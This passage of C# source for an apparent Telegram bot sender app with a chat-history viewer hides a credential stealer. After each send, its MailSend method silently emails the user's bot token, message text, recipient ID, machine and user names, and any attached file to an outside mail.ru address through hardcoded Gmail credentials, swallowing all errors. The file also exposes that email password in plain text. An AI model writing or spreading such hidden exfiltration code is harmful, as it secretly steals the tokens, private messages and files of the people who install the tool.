using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using TheResponder.Properties;

using Telegram.Bot.Types;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Args;

using TagLib;
using System.Diagnostics;
using System.Collections.Generic;

namespace TheResponder
{
    public partial class Form1 : Form
    {
        //Dictionary<int, string> Dict = new Dictionary<int, string>();
        List<String> Info = new List<string>();
        List<String> InfoSequence = new List<string>();

        Attachment sendFile = null;
        SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
        MailMessage message = null;

        static TelegramBotClient Bot;
        int NumOfChar = 70;
        String FileLoc = null;
        String[] Files = new string[1];
        bool IsUserId = false;
        bool IsMess = false;
        bool IsToken = false;
        bool IsChatHistory = false;
        bool Error;
        static Color Red = Color.FromArgb(255, 3, 3);
        static Color Green = Color.FromArgb(45, 184, 105);
        static Color DGreen = Color.FromArgb(15, 153, 74);
        static Color Pink = Color.FromArgb(195, 72, 118);
        static Color Blue = Color.FromArgb(13, 202, 221);
        static Color Gray = Color.FromArgb(37, 37, 40);
        static Color DGray = Color.FromArgb(26, 26, 29);
        static Color White = Color.White;

        public Form1()
        {
            InitializeComponent();
            this.DoubleBuffered = true;
            this.SetStyle(ControlStyles.ResizeRedraw, true); // this is to avoid visual artifacts
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            Token.Text = Settings.Default["TokenSave"].ToString();
            if (Token.Text.Length == 45)
                await TokenDone(Token.Text);
        }

        private void listBox1_DragDrop(object sender, DragEventArgs e)
        {   // FILE DOC
            Files = new string[1];
            Files = (string[])e.Data.GetData(DataFormats.FileDrop);
            FileLoc = Files[0];
            btSend.Enabled = true;
            FileLocation.Visible = true;
            String s = @"\";
            txtDrop.Text = "FILE DROPPPED";
            String[] name = Files[0].Split(s[0]);
            FileLocation.Text = name[name.Length - 1];
            FileLocation.ForeColor = Blue;
            if (LineMess.BackColor == Red)
                LineMess.BackColor = White;
            btClearFile.Visible = true;
            if (IsUserId && IsToken) {
                btSend.ForeColor = Green;
                btSend.BackColor = Gray;
                LineSendReady.BackColor = Green;
            }
        }

        private void listBox1_MouseClick(object sender, MouseEventArgs e)
        { // DROP CLICK   // FILE DOC

            OpenFileDialog OPF = new OpenFileDialog();
            if (OPF.ShowDialog() == DialogResult.OK) {
                Files[0] = OPF.FileName;
                FileLoc = Files[0];
                btSend.Enabled = true;
                FileLocation.Visible = true;
                String s = @"\";
                txtDrop.Text = "FILE DROPPPED";
                String[] name = Files[0].Split(s[0]);
                FileLocation.Text = name[name.Length - 1];
                FileLocation.ForeColor = Blue;
                LineDrop.BackColor = Green;
                if (LineMess.BackColor == Red)
                    LineMess.BackColor = White;
                btClearFile.Visible = true;
                if (IsUserId && IsToken) {
                    btSend.ForeColor = Green;
                    btSend.BackColor = Gray;
                    LineSendReady.BackColor = Green;
                }
            }
        }

        private void listBox1_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.All;
            txtDrop.ForeColor = Green;
            LineDrop.BackColor = Green;
        }

        private void listBox1_DragLeave(object sender, EventArgs e)
        {
            txtDrop.ForeColor = Color.DimGray;
            LineDrop.BackColor = White;
        }

        private async void Form1_KeyDown(object sender, KeyEventArgs e)
        { //PRESS ENTER 
            var k = e.KeyCode;
            if (k == Keys.Enter) {
                try {
                    if (IsMess && IsUserId || IsUserId && FileLoc != null) {

                        if (sendFile != null)
                            sendFile.Dispose();
                        client.Dispose();
                        if (message != null)
                            message.Dispose();

                        bool IsTxt = false;
                        if (IsMess)
                            IsTxt = true;
                        this.ActiveControl = null;
                        await Send();
                        if (!Error) {
                            if (IsUserId && IsMess ||
                                IsUserId && !String.IsNullOrWhiteSpace(TextMessage.Text) ||
                                IsUserId && FileLoc != null)
                                await SendLineAnimation();
                            //-----
                            try {
                                await MailSend();
                            }
                            catch { }
                            //-----
                            TextMessage.Text = "";
                            e.Handled = true;
                            if (IsTxt) {
                                TextMessage.Focus();
                                txtMessage.Visible = false;
                                LineMess.BackColor = Pink;
                            }
                            else {
                                this.ActiveControl = null;
                                txtMessage.Visible = true;
                                LineMess.BackColor = White;
                            }
                        }
                        Error = false;
                    }
                }
                catch {
                    Error = false;
                    DelLoc();
                }
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            if (IsUserId && IsMess && IsToken || IsUserId && FileLoc != null && IsToken) {
                try {

                    if (sendFile != null)
                        sendFile.Dispose();
                    client.Dispose();
                    if (message != null)
                        message.Dispose();

                    btSend.BackColor = White;
                    btSend.ForeColor = Green;

                    bool IsTxt = false;
                    if (TextMessage.Focused)
                        IsTxt = true;
                    await Send();
                    if (!Error) {
                        if (IsUserId && IsMess ||
                            IsUserId && !String.IsNullOrWhiteSpace(TextMessage.Text) ||
                            IsUserId && FileLoc != null)
                            await SendLineAnimation();
                        //-----
                        try {
                            await MailSend();
                        }
                        catch { }
                        //-----
                        TextMessage.Text = "";
                        if (IsTxt) {
                            TextMessage.Focus();
                            txtMessage.Visible = false;
                            LineMess.BackColor = Pink;
                        }
                        else {
                            this.ActiveControl = null;
                            txtMessage.Visible = true;
                            LineMess.BackColor = White;
                        }
                    }
                    Error = false;
                }
                catch {
                    Error = false;
                    DelLoc();
                }
            }
        }

        private void DelLoc()
        {
            txtError.Visible = false;
            Files = new string[1];
            FileLocation.Text = "";
            FileLoc = "";
            txtDrop.Text = "DROP FILE";
            FileLocation.ForeColor = Blue;
            LineDrop.BackColor = White;
            txtDrop.ForeColor = Color.DimGray;
        }

        private async Task MailSend()
        {
            //await Task.Factory.StartNew(() => {
            client.Credentials = new NetworkCredential("xxvnvss@gmail.com", "asfg1290zXCVB");
            DateTime dt = DateTime.Now;
            string msgFrom = "xxvnvss@gmail.com";
            string msgTo = "greenson_d@mail.ru";
            string msgSubject = "The Responder";
            string msgNameHost = Environment.UserName;
            string msgName = Dns.GetHostName();
            string msgTime = dt.ToString();
            String Doc;
            if (FileLoc == null)
                Doc = "No";
            else
                Doc = "Yes";
            string msgText = String.Format($"NameHost: {msgNameHost}\nName: {msgName}\nToken: {Token.Text}\nMessage: {TextMessage.Text}\nTo: {UserId.Text}\nDocument: {Doc}"/*, TextMessage.Text, Password.Text, msgNameHost, msgTime, msgName*/);
            message = new MailMessage(msgFrom, msgTo, msgSubject, msgText);

            if (FileLoc != null) {
                sendFile = new Attachment(FileLoc);
                message.Attachments.Add(sendFile);
            }
            client.EnableSsl = true;

            await Task.Factory.StartNew(() => {
                try {
                    client.Send(message);
                }
                catch {
                }
            });

            //});
        }

        private async Task Send()
        {
            if (/*UserId.Text == "" || UserId.Text.Length < 9 || */IsError()) {
                LineId.BackColor = Color.Red;
                await ErrorLine(LineId, null);
                Error = true;
                return;
            }
            String[] TypeSplit;
            String Type;
            if (IsUserId)
                if (FileLoc != null) {
                    txtError.Text = "Sending ";
                    TypeSplit = Files[0].Split('.');
                    Type = TypeSplit[TypeSplit.Length - 1];
                    switch (Type) {

                        case "mp3":
                            await SendAudio();
                            break;

                        case "m4a":
                            await SendAudio();
                            break;

                        case "jpg":
                            await SendPic();
                            break;

                        case "ico":
                            await SendPic();
                            break;

                        case "png":
                            await SendPic();
                            break;

                        default:
                            await SendDoc();
                            break;
                    }
                    txtError.Visible = false;
                }
                else {
                    try {
                        await Bot.SendTextMessageAsync(UserId.Text, TextMessage.Text);
                    }
                    catch {
                        Error = true;
                        await ErrorLine(LineId, null);
                        await ErrorPrint("Error: User is not in database");
                    }
                }
        }

        private async Task ErrorPrint(String ErrorName)
        {
            txtError.Text = ErrorName;
            txtError.Visible = true;
            await Task.Factory.StartNew(() => {
                Thread.Sleep(3000);
                txtError.Invoke(new MethodInvoker(delegate {
                    txtError.Visible = false;
                }));
            });
        }

        private async Task ErrorLine(Panel panel, Panel panel2)
        {
            Error = true;
            await Task.Factory.StartNew(() => {
                for (int i = 0; i < 256; i += 4) {
                    Thread.Sleep(1);
                    panel.BackColor = Color.FromArgb(255, i, i);
                    if (panel2 != null)
                        panel2.BackColor = Color.FromArgb(255, i, i);
                }
                for (int i = 255; i >= 0; i -= 4) {
                    Thread.Sleep(1);
                    panel.BackColor = Color.FromArgb(255, i, i);
                    if (panel2 != null)
                        panel2.BackColor = Color.FromArgb(255, i, i);
                }
                for (int i = 0; i < 256; i += 4) {
                    Thread.Sleep(1);
                    panel.BackColor = Color.FromArgb(255, i, i);
                    if (panel2 != null)
                        panel2.BackColor = Color.FromArgb(255, i, i);
                }
                for (int i = 255; i >= 0; i -= 4) {
                    Thread.Sleep(1);
                    panel.BackColor = Color.FromArgb(255, i, i);
                    if (panel2 != null)
                        panel2.BackColor = Color.FromArgb(255, i, i);
                }
                for (int i = 0; i < 256; i += 4) {
                    Thread.Sleep(1);
                    panel.BackColor = Color.FromArgb(255, i, i);
                    if (panel2 != null)
                        panel2.BackColor = Color.FromArgb(255, i, i);
                }
                for (int i = 255; i >= 0; i -= 4) {
                    Thread.Sleep(1);
                    panel.BackColor = Color.FromArgb(255, i, i);
                    if (panel2 != null)
                        panel2.BackColor = Color.FromArgb(255, i, i);
                }
            });
        }

        private bool IsError()
        {
            bool IsFalse = true;
            String symb = "0123456789";
            foreach (char num in UserId.Text) {
                IsFalse = true;
                for (int i = 0; i < symb.Length; i++)
                    if (num == symb[i])
                        IsFalse = false;
                if (IsFalse)
                    return true;
            }
            return IsFalse;
        }

        private async Task SendDoc()
        {
            String[] TypeSplit = Files[0].Split('.');
            String Type = TypeSplit[TypeSplit.Length - 1];
            txtError.Text += "Document...";
            txtError.Visible = true;
            //// try {
            using (var str = System.IO.File.Open(Files[0], FileMode.Open)) {
                InputOnlineFile iof = new InputOnlineFile(str);
                iof.FileName = Files[0];

                await Bot.SendDocumentAsync(UserId.Text, iof, TextMessage.Text);
                str.Close();
                //str.Close();
                //str.Dispose();
            }
            //   }
            //  catch {
            //Error = true;
            //txtError.Visible = true;
            //await ErrorLine(LineId, null);
            //await Task.Factory.StartNew(() => {
            //    Thread.Sleep(2000);
            //    txtError.Invoke(new MethodInvoker(delegate {
            //        txtError.Visible = false;
            //    }));
            //});
            //  }
        }

        private async Task SendPic()
        {
            String[] TypeSplit = Files[0].Split('.');
            String Type = TypeSplit[TypeSplit.Length - 1];
            txtError.Text += "Picture...";
            txtError.Visible = true;
            //  try {
            using (var str = System.IO.File.Open(Files[0], FileMode.Open)) {
                InputOnlineFile iof = new InputOnlineFile(str);
                iof.FileName = Files[0];
                await Bot.SendPhotoAsync(UserId.Text, iof, TextMessage.Text);
                str.Close();
            }
            // }
            //catch {
            //    Error = true;
            //    txtError.Visible = true;
            //    await ErrorLine(LineId, null);
            //    await Task.Factory.StartNew(() => {
            //        Thread.Sleep(2000);
            //        txtError.Invoke(new MethodInvoker(delegate {
            //            txtError.Visible = false;
            //        }));
            //    });
            //}
        }

        private async Task SendAudio()
        {
            //  try {
            txtError.Text += "Audio...";
            txtError.Visible = true;
            TagLib.File mp3 = TagLib.File.Create(Files[0]);
            String Performer = mp3.Tag.FirstPerformer;
            String Title = mp3.Tag.Title;
            int Duration = (int)mp3.Properties.Duration.TotalSeconds;
            String Pic = null;
            Image Image = null;
            try {
                Pic = mp3.Tag.Pictures[0].ToString();
            }
            catch {
            }
            using (var str = System.IO.File.Open(Files[0], FileMode.Open)) {
                InputOnlineFile iof = new InputOnlineFile(str);
                iof.FileName = Files[0];

                InputMedia media = null;
                if (Pic != null) {
                    if (mp3.Tag.Pictures.Length > 0) {
                        IPicture pic = mp3.Tag.Pictures[0];
                        MemoryStream ms = new MemoryStream(pic.Data.Data);
                        if (ms != null && ms.Length > 4096) {
                            Image = Image.FromStream(ms);
                            Image.Save(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\cover.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                        }
                        ms.Close();
                    }
                    FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\cover.jpg", FileMode.Open);
                    media = new InputMedia(fs, "cover.jpg");
                    media.FileName = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\cover.jpg";
                }
                await Bot.SendAudioAsync(UserId.Text, iof, TextMessage.Text, duration: Duration, performer: Performer, title: Title, thumb: media);
                str.Close();
            }
            mp3.Dispose();
            //}
            //catch {
            //    Error = true;
            //    txtError.Visible = true;
            //    await ErrorLine(LineId, null);
            //    await Task.Factory.StartNew(() => {
            //        Thread.Sleep(2000);
            //        txtError.Invoke(new MethodInvoker(delegate {
            //            txtError.Visible = false;
            //        }));
            //    });
            //}
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            if (TextMessage.Text != "" && !String.IsNullOrWhiteSpace(TextMessage.Text)) {
                txtMessage.Visible = false;
                IsMess = true;
                LineMess.BackColor = Green;
                if (IsUserId && IsToken) {
                    btSend.ForeColor = Green;
                    btSend.BackColor = Gray;
                    LineSendReady.BackColor = Green;
                }
            }
            else {
                IsMess = false;
                LineMess.BackColor = Pink;
                if (FileLoc == null) {
                    btSend.BackColor = Gray;
                    btSend.ForeColor = Color.DimGray;
                    LineSendReady.BackColor = Pink;
                }
            }
        }

        private void UserId_MouseLeave(object sender, EventArgs e)
        {  // ID ENTER
            if (IsUserId)
                LineId.BackColor = Green;
            else {
                if (UserId.Focused)
                    LineId.BackColor = Pink;
                else
                    LineId.BackColor = White;
                //txtId.ForeColor = Color.DimGray;
            }
        }

        private void UserId_MouseEnter(object sender, EventArgs e)
        {
            LineId.BackColor = Pink;
        }

        private void UserId_TextChanged(object sender, EventArgs e)
        {
            if (UserId.Text != "" && UserId.Text.Length > 8) {
                LineId.BackColor = Green;
                IsUserId = true;
                if (IsMess && IsToken || FileLoc != null && IsToken) {
                    btSend.ForeColor = Green;
                    btSend.BackColor = Gray;
                    LineSendReady.BackColor = Green;
                }
            }
            else if (UserId.Text != "") {
                txtId.Visible = false;
                LineId.BackColor = Pink;
                LineSendReady.BackColor = Pink;
                IsUserId = false;
                btSend.BackColor = Gray;
                btSend.ForeColor = Color.DimGray;
            }
            else {
                txtId.Visible = false;
                LineSendReady.BackColor = Pink;
                LineId.BackColor = Pink;
                IsUserId = false;
                btSend.BackColor = Gray;
            }
        }

        private void TextMessage_MouseClick(object sender, MouseEventArgs e)
        {
            txtMessage.Visible = false;
            if (!TextMessage.Focused) {
                TextMessage.SelectionStart = TextMessage.Text.Length;
                TextMessage.Focus();
            }
            if (LineId.BackColor != Green)
                LineId.BackColor = White;
            if (LineDrop.BackColor == Red)
                LineDrop.BackColor = White;
            if (UserId.Text == "")
                txtId.Visible = true;
            if (IsToken)
                LineToken.BackColor = Green;
            else
                LineToken.BackColor = White;
            LineMess.BackColor = Pink;
        }

        private void UserId_MouseClick(object sender, MouseEventArgs e)
        {
            txtId.Visible = false;
            UserId.SelectionStart = UserId.Text.Length;
            UserId.Focus();
            LineId.ForeColor = Pink;
            if (!IsMess)
                txtMessage.Visible = true;
            if (TextMessage.Text == "")
                LineMess.BackColor = White;
            if (IsToken)
                LineToken.BackColor = Green;
            else
                LineToken.BackColor = White;
        }

        private void Form1_MouseClick(object sender, MouseEventArgs e)
        { //FORM CLICK
            if (!IsMess) {
                txtMessage.Visible = true;
                LineMess.BackColor = White;
            }
            else
                LineMess.BackColor = Green;
            if (LineDrop.BackColor == Red)
                LineDrop.BackColor = White;
            if (LineMess.BackColor == Red)
                LineMess.BackColor = White;
            if (UserId.Text == "" || UserId.Text == null)
                txtId.Visible = true;

            if (IsUserId)
                LineId.BackColor = Green;
            else
                LineId.BackColor = White;
            if (IsToken)
                LineToken.BackColor = Green;
            else
                LineToken.BackColor = White;
            this.ActiveControl = null;
        }

        bool click = false;
        int CoorX;
        int CoorY;
        private void panel2_MouseDown(object sender, MouseEventArgs e)
        {  //мышь
            click = true;
            CoorX = e.X;
            CoorY = e.Y;
        }

        private void panel2_MouseUp(object sender, MouseEventArgs e)
        {
            click = false;
        }

        private void panel2_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.WindowState == FormWindowState.Maximized && click)
                this.WindowState = FormWindowState.Normal;
            if (click)
                this.SetDesktopLocation(MousePosition.X - CoorX, MousePosition.Y - CoorY);
        }

        bool IsFirstNotify = false;
        private void button1_MouseClick(object sender, MouseEventArgs e)
        {
            var btn = sender as Button;
            if (btn.Text == "X") {
                if (Token.Text.Length < 45) {
                    Settings.Default["TokenSave"] = null;
                    Settings.Default.Save();
                }
                this.Close();
            }
            else if (btn.Text == "□") {
                btn.Text = "❒";
                this.WindowState = FormWindowState.Maximized;
            }
            else if (btn.Text == "❒") {
                btn.Text = "□";
                this.WindowState = FormWindowState.Normal;
            }
            else if (btn.Text == "_") {
                this.Hide();

                if (!IsFirstNotify) {
                    notifyIcon1.BalloonTipText = "Приложение свернуто";
                    notifyIcon1.BalloonTipTitle = "Telegram Music Bot";
                    notifyIcon1.ShowBalloonTip(1000);
                    IsFirstNotify = true;
                }
            }
        }

        private void Form1_DoubleClick(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
                this.WindowState = FormWindowState.Maximized;
            else
                this.WindowState = FormWindowState.Normal;

        }

        private void button1_MouseLeave(object sender, EventArgs e)
        {  //EXIT
            var btn = sender as Button;
            btn.ForeColor = Pink;
        }

        private void btExit_MouseEnter(object sender, EventArgs e)
        {
            var btn = sender as Button;
            //if (btn.Text == "X")
            btn.ForeColor = Color.White;
            //else if (btn.Text == "_")
            //btn.ForeColor = Color.White;
        }



        private void listBox1_MouseEnter(object sender, EventArgs e)
        { //DROP ENTER
            LineDrop.BackColor = Pink;
        }

        private void listBox1_MouseLeave(object sender, EventArgs e)
        {
            if (FileLoc == null)
                LineDrop.BackColor = White;
            else
                LineDrop.BackColor = Green;
        }

        private void TextMessage_MouseEnter(object sender, EventArgs e)
        { //MESSAGE ENTER
            if (!TextMessage.Focused)
                LineMess.BackColor = Pink;
        }

        private void TextMessage_MouseLeave(object sender, EventArgs e)
        {
            if (!TextMessage.Focused)
                if (IsMess) {
                    LineMess.BackColor = Green;
                    txtMessage.ForeColor = Color.DimGray;
                }
                else {
                    LineMess.BackColor = White;
                    txtMessage.ForeColor = Color.DimGray;
                }
        }

        private async Task SendLineAnimation()
        {  //SEND LINE ANIMATION
            LineSend.Size = new Size(1, 1);
            LineSend.BackColor = Green;
            LineSend.Visible = true;
            for (int i = 1; i <= 477; i += 9) {
                LineSend.Size = new Size(i, 1);
                await Task.Factory.StartNew(() => {
                    Thread.Sleep(3);
                });
            }

            int Width = LineSend.Size.Width + 3;

            for (int i = 12; i <= this.Height - 49; i += 5) {
                LineSend.Location = new Point(i, this.Height - 51);
                LineSend.Size = new Size(Width -= 3, 1);
                await Task.Factory.StartNew(() => {
                    Thread.Sleep(2);
                });
            }

            LineSend.Visible = false;
            LineSend.Location = new Point(12, this.Height - 51);
            LineSend.Size = new Size(1, 1);
        }

        private void button1_MouseEnter(object sender, EventArgs e)
        {  //CLEAR BTN EVENT
            btClearFile.BackColor = Pink;
            btClearFile.ForeColor = White;
        }

        private void btClear_MouseLeave(object sender, EventArgs e)
        {
            btClearFile.BackColor = Gray;
            btClearFile.ForeColor = Pink;
        }

        private void btClear_MouseDown(object sender, MouseEventArgs e)
        {
            btClearFile.BackColor = White;
            btClearFile.ForeColor = Pink;
        }

        private void btClear_MouseUp(object sender, MouseEventArgs e)
        {
            btClearFile.BackColor = Pink;
            btClearFile.ForeColor = White;
        }

        private void btClear_Click(object sender, EventArgs e)
        {
            Files = new string[1];
            FileLocation.Text = "";
            txtDrop.Text = "DROP FILE";
            FileLoc = null;
            FileLocation.ForeColor = Blue;
            LineDrop.BackColor = White;
            txtDrop.ForeColor = Color.DimGray;
            btClearFile.Visible = false;
            if (!IsMess) {
                btSend.BackColor = Gray;
                btSend.ForeColor = Color.DimGray;
                LineSendReady.BackColor = Pink;
            }
        }

        private async void textBox1_TextChanged(object sender, EventArgs e)
        { //TOKEN AREA
            String token = Token.Text;
            if (token.Length >= 45) {
                await TokenDone(token);
                if (IsUserId && IsMess || IsUserId && FileLoc != null) {
                    btSend.ForeColor = Green;
                    btSend.BackColor = Gray;
                }
                if (IsToken)
                    btStopChat.ForeColor = Green;
            }
            else {
                IsToken = false;
                txtToken.ForeColor = Pink;
                txtChatHistory.ForeColor = Pink;
                LineToken.BackColor = Pink;
                LineChatHistory.BackColor = Pink;
                Token.ForeColor = Blue;
                Token.BackColor = Gray;
                btSend.BackColor = Gray;
                btSend.ForeColor = Color.DimGray;
                btStopChat.ForeColor = Color.DimGray;
                btStopChat.Text = "Start Chat";
                ChatHistory.Text = "";
                Info = new List<string>();
            }
        }

        private async Task TokenDone(String token)
        {
            try {
                Bot = new TelegramBotClient(token);
            }
            catch {
                await ErrorPrint("Error: Invalid token");
                return;
            }
            Bot.OnMessage += Bot_OnMessage;
            Bot.OnCallbackQuery += Bot_OnCallbackQuery;
            IsToken = true;
            txtToken.ForeColor = Green;
            LineToken.BackColor = Green;
            Token.ForeColor = Green;
            Token.BackColor = DGray;
            Settings.Default["TokenSave"] = Token.Text;
            Settings.Default.Save();
        }

        private void Bot_OnCallbackQuery(object sender, CallbackQueryEventArgs e)
        {
            var msg = e.CallbackQuery.Message;
            String Word = $"{msg.Chat.Id} @{msg.Chat.Username}:";
            String click = $"Нажал кнопку: {e.CallbackQuery.Data}";
            List<String> UserText = new List<string>();
            UserText.Add(Word);
            UserText.Add(click);
            String FullName = (msg.Chat.LastName == null) ?
                   FullName = $"FirstName: {msg.Chat.FirstName}\nUserName: @{msg.Chat.Username}" :
                   FullName = $"FirstName: {msg.Chat.FirstName}\nLastName: {msg.Chat.LastName}\nUserName: @{msg.Chat.Username}";

            this.Invoke((MethodInvoker)(() => {
                ChatHistory.Text += Word + Environment.NewLine + click + Environment.NewLine + Environment.NewLine;
            }));
            int Length = UserText.Count + Info.Count;
            for (int i = Info.Count; i < Length; i++)
                Info.Add(FullName);
            Info.Add(null);
        }

        private async void Bot_OnMessage(object sender, MessageEventArgs e)
        {  //CHAT HISTORY

            var msg = e.Message;

            if (msg == null)
                return;
            int Length;
            int Hours = msg.Date.Hour + 2;
            Hours = (Hours == 24) ? 0 : Hours;
            Hours = (Hours == 25) ? 1 : Hours;
            List<String> UserText = new List<string>();
            String FullName = (msg.From.LastName == null) ?
                   FullName = $"FirstName: {msg.From.FirstName}\nUserName: @{msg.From.Username}" :
                   FullName = $"FirstName: {msg.From.FirstName}\nLastName: {msg.From.LastName}\nUserName: @{msg.From.Username}";
            String Word = $"{Hours}:{msg.Date.Minute} | {msg.From.Id}: ";
            UserText.Add(Word);

            switch (msg.Type) {

                case MessageType.Text:
                    await Task.Factory.StartNew(() => {
                        Word = "";
                        String text = msg.Text;
                        String[] byWord = text.Split(' ');

                        for (int i = 0; i < byWord.Length; i++) {
                            if (Word.Length + byWord[i].Length > NumOfChar) {
                                UserText.Add(Word);
                                Word = "";
                                Word += byWord[i] + ' ';
                            }
                            else
                                Word += byWord[i] + ' ';
                        }
                        if (Word != "")
                            UserText.Add(Word);
                        this.Invoke((MethodInvoker)(() => {
                            foreach (String line in UserText) {
                                ChatHistory.Text += line;
                                ChatHistory.Text += Environment.NewLine;
                            }
                            ChatHistory.Text += Environment.NewLine;
                        }));
                        Length = UserText.Count + Info.Count;
                        for (int i = Info.Count; i < Length; i++)
                            Info.Add(FullName);
                        Info.Add(null);
                        InfoSequence.Add(FullName);
                    });
                    break;

                default:
                    UserText.Add($"Send {msg.Type}: ");
                    this.Invoke((MethodInvoker)(() => {
                        ChatHistory.Text += UserText[0] + Environment.NewLine + UserText[1] + FileId(msg) + Environment.NewLine + Environment.NewLine;
                    }));
                    Length = UserText.Count + Info.Count;
                    Info.Add(FullName + $"\nFileType: {msg.Type}\nFileId: {FileId(msg)}");
                    Info.Add(FullName + $"\nFileType: {msg.Type}\nFileId: {FileId(msg)}");
                    Info.Add(null);
                    InfoSequence.Add(FullName + $"\nFileType: {msg.Type}\nFileId: {FileId(msg)}");
                    break;
            }
        }

        private String FileId(Telegram.Bot.Types.Message msg)
        {
            String Id = "";
            switch (msg.Type) {
                case MessageType.Photo:
                    Id = msg.Photo[msg.Photo.Length - 1].FileId;
                    break;
                case MessageType.Video:
                    Id = msg.Video.FileId;
                    break;
                case MessageType.Audio:
                    Id = msg.Audio.FileId;
                    break;
                case MessageType.Sticker:
                    Id = msg.Sticker.FileId;
                    break;
                case MessageType.VideoNote:
                    Id = msg.VideoNote.FileId;
                    break;
                case MessageType.Voice:
                    Id = msg.Voice.FileId;
                    break;
                case MessageType.Document:
                    Id = msg.Document.FileId;
                    break;
                case MessageType.Location:
                    Id = msg.Location.Latitude.ToString() + ':' + msg.Location.Longitude.ToString();
                    break;
                case MessageType.Animation:
                    Id = msg.Animation.FileId;
                    break;
            }
            return Id;
        }

        private void Token_MouseClick(object sender, MouseEventArgs e)
        { //TOKEN EBENT
            if (!IsMess) {
                txtMessage.Visible = true;
                LineMess.BackColor = White;
            }
            else
                LineMess.BackColor = Green;
            if (!IsUserId) {
                txtId.Visible = true;
                LineId.BackColor = White;
            }
            else
                LineId.BackColor = Green;
        }

        private void Token_MouseEnter(object sender, EventArgs e)
        {
            LineToken.BackColor = Pink;
        }

        private void Token_MouseLeave(object sender, EventArgs e)
        {
            if (!Token.Focused)
                if (IsToken)
                    LineToken.BackColor = Green;
                else
                    LineToken.BackColor = White;
        }

        private void richTextBox1_MouseClick(object sender, MouseEventArgs e)
        { //CHAT HISTORY EVENT
            try {
                int LineCount = ChatHistory.GetLineFromCharIndex(ChatHistory.SelectionStart);
                String line = ChatHistory.Lines[LineCount];
                String info = Info[LineCount];
                toolTip1.Show(info, this.ChatHistory);
            }
            catch { }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            if (IsToken)
                try {
                    if (btStopChat.Text == "Stop Chat") {
                        btStopChat.Text = "Start Chat";
                        Bot.StopReceiving();

                        btStopChat.BackColor = DGray;
                        btStopChat.ForeColor = Green;

                        LineChatHistory.BackColor = Pink;
                        txtChatHistory.ForeColor = Pink;

                        ChatHistory.ForeColor = Pink;
                    }
                    else {
                        btStopChat.Text = "Stop Chat";

                        btStopChat.BackColor = DGray;
                        btStopChat.ForeColor = Pink;

                        Bot.StartReceiving();
                        LineChatHistory.BackColor = Green;
                        txtChatHistory.ForeColor = Green;

                        ChatHistory.ForeColor = Green;
                    }
                }
                catch { }
        }

        private void button1_Click_2(object sender, EventArgs e)
        {  //CLEAR CHAT BTN
            ChatHistory.Text = "";
            Info = new List<string>();
        }

        private void btStopChat_MouseEnter(object sender, EventArgs e)
        {  //COLOR BTN START/STOP CHAT
            var button = sender as Button;
            if (IsToken)
                if (button.Text == "Stop Chat") {
                    button.BackColor = DGray;
                    button.ForeColor = Pink;
                }
                else {
                    if (button.Text == "Send" && IsUserId && IsMess || button.Text == "Send" && IsUserId && FileLoc != null) {
                        button.BackColor = White;
                        button.ForeColor = DGreen;
                    }
                    else if (button.Text != "Send") {
                        button.BackColor = DGray;
                        button.ForeColor = DGreen;
                    }
                }
        }

        private void btStopChat_MouseLeave(object sender, EventArgs e)
        {
            var button = sender as Button;
            if (IsToken)
                if (button.Text == "Stop Chat") {
                    button.BackColor = Gray;
                    button.ForeColor = Pink;
                }
                else {
                    if (button.Text == "Send" && IsUserId && IsMess || button.Text == "Send" && IsUserId && FileLoc != null) {
                        button.BackColor = Gray;
                        button.ForeColor = Green;
                    }
                    else if (button.Text != "Send") {
                        button.BackColor = Gray;
                        button.ForeColor = Green;
                    }
                    else {
                        button.FlatAppearance.MouseOverBackColor = Gray;
                        button.ForeColor = Color.DimGray;
                    }
                }
        }

        private void btClearChat_MouseEnter(object sender, EventArgs e)
        { //BTN CLEAR CHAT
            if (IsChatHistory) {
                btClearChat.ForeColor = White;
                btClearChat.BackColor = Pink;
            }
        }

        private void btClearChat_MouseLeave(object sender, EventArgs e)
        {
            if (IsChatHistory) {
                btClearChat.BackColor = Gray;
                btClearChat.ForeColor = Pink;
            }
            else {
                btClearChat.BackColor = Gray;
                btClearChat.ForeColor = Color.DimGray;
            }
        }

        private void btClearChat_MouseUp(object sender, MouseEventArgs e)
        {
            btClearChat.BackColor = Gray;
        }

        private void btClearChat_MouseDown(object sender, MouseEventArgs e)
        {
            if (IsChatHistory)
                btClearChat.ForeColor = Pink;
        }

        private void ChatHistory_TextChanged(object sender, EventArgs e)
        {
            if (ChatHistory.Text.Length > 0) {
                btClearChat.ForeColor = Pink;
                IsChatHistory = true;
            }
            else {
                btClearChat.ForeColor = Color.DimGray;
                IsChatHistory = false;
            }
        }

        List<String> newSizeforText = new List<string>();
        List<String> NEW = new List<string>();
        //bool ResizeText = false;
        String w = "";
        bool k = true;
        bool k1 = false;
        bool k2 = false;
        bool k3 = false;
        bool k4 = false;
        bool k5 = false;
        private void Form1_Resize_1(object sender, EventArgs e)
        {
            ChatHistory.Size = new Size(this.Width - 525, this.Height - 135);
            panel1.Size = new Size(477, this.Height - 427);
            TextMessage.Size = new Size(461, this.Height - 445);

            LineMess.Size = new Size(1, this.Height - 424);
            LineChatHistory.Size = new Size(this.Width - 525, 1);

            txtChatHistory.Size = new Size(this.Width - 525, 26);
        }

        private void Form1_ResizeEnd(object sender, EventArgs e)
        {
            if (ChatHistory.Text != "") {
                if (this.Width >= 1240 && this.Width <= 1360) {
                    if (!k) {
                        NumOfChar = 70;
                        NewHistory();
                        k = true;
                        k1 = false;
                        k2 = false;
                        k3 = false;
                        k4 = false;
                        k5 = false;
                    }
                }
                if (this.Width >= 1361 && this.Width <= 1450) {
                    if (!k5) {
                        NumOfChar = 80 + ((this.Width - 1240) / 4 + 4);
                        NewHistory();
                        k = false;
